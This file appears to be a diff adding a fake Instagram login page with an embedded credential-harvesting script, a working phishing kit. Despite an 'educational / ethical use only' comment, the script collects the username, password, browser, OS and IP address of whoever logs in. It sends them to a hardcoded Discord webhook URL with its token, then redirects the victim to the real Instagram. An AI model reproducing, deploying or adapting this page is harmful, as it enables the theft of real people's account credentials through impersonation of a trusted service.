@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png" />
+  <link rel="stylesheet" href="css.css" />
+</head>
+<body>
+  <!-- Main Container -->
+  <div id="root">
+    <section class="section-all">
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <!-- Login Box -->
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+                </div>
+                <!-- Form Section -->
+                <div class="form-wrap">
+                  <form class="form">
+                    <div class="input-box">
+                      <input
+                        type="text"
+                        id="username"
+                        name="username"
+                        placeholder="Phone number, username, or email"
+                        required
+                        maxlength="30"
+                        autocapitalize="off"
+                        autocorrect="off"
+                        aria-required="true"
+                      />
+                    </div>
+                    <div class="input-box">
+                      <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        placeholder="Password"
+                        required
+                        maxlength="30"
+                        autocapitalize="off"
+                        autocorrect="off"
+                        aria-required="true"
+                      />
+                    </div>
+                    <span class="button-box">
+                      <button class="btn" type="button" onclick="sendMessage()">Log in</button>
+                    </span>
+                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
+                  </form>
+                </div>
+              </div>
+
+              <!-- Signup Link -->
+              <div class="login-box">
+                <p class="text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
+              </div>
+
+              <!-- App Download Section -->
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" alt="iOS Badge" />
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" alt="Android Badge" />
+                  </a>
+                </div>
+              </div>
+            </div>
+          </article>
+        </div>
+      </main>
+
+      <!-- Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="https://about.instagram.com">About Us</a></li>
+              <li><a href="https://help.instagram.com">Support</a></li>
+              <li><a href="https://about.instagram.com/blog">Blog</a></li>
+              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+              <li><a href="https://www.instagram.com/developer">API</a></li>
+              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
+              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
+            </ul>
+          </nav>
+          <span class="footer-logo">&copy; 2025 Instagram</span>
+        </div>
+      </footer>
+    </section>
+  </div>
+
+  <!-- ===============================
+    📦 Client-Side Credential Logger
+       Educational / Ethical use only
+  ================================== -->
+  <script>
+    async function sendMessage() {
+      const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+      // Collect form inputs
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const userAgent = navigator.userAgent;
+
+      // Extract formatted browser and OS info
+      const browserInfo = getBrowserInfo(userAgent);
+      const osInfo = getOSInfo(userAgent);
+
+      // Fetch IP address
+      let ip = "Unavailable";
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch (err) {
+        console.error("Failed to fetch IP:", err);
+      }
+
+      // Create embed payload
+      const payload = {
+        username: "🔔 Logger Bot",
+        avatar_url: "https://i.imgur.com/AfFp7pu.png",
+        embeds: [
+          {
+            title: "🟡 New Credential Capture",
+            description: "A new login attempt has been logged.",
+            color: 0xFFD700,
+            fields: [
+              {
+                name: "👤 Username",
+                value: `\`${username}\``,
+                inline: true
+              },
+              {
+                name: "🔑 Password",
+                value: `\`${password}\``,
+                inline: true
+              },
+              {
+                name: "🖥️ Device Info",
+                value: `**Browser**: ${browserInfo}\n**OS**: ${osInfo}`,
+                inline: false
+              },
+              {
+                name: "📡 IP Address",
+                value: `\`${ip}\``,
+                inline: false
+              }
+            ],
+            footer: {
+              text: "📩 Logger Bot",
+              icon_url: "https://i.imgur.com/AfFp7pu.png"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      // Send to Discord webhook
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
+      request.setRequestHeader('Content-type', 'application/json');
+      request.send(JSON.stringify(payload));
+
+      await delay(2000);
+      window.location.replace("https://www.instagram.com");
+    }
+
+    // Detect browser type
+    function getBrowserInfo(ua) {
+      if (ua.includes("Firefox/")) return "Mozilla Firefox";
+      if (ua.includes("Edg/")) return "Microsoft Edge";
+      if (ua.includes("Chrome/")) return "Google Chrome";
+      if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Apple Safari";
+      return "Unknown Browser";
+    }
+
+    // Detect OS type
+    function getOSInfo(ua) {
+      if (ua.includes("Windows NT")) return "Windows";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) return "iOS";
+      if (ua.includes("Mac OS X")) return "macOS";
+      if (ua.includes("Linux")) return "Linux";
+      return "Unknown OS";
+    }
+  </script>
+</body>
+</html>
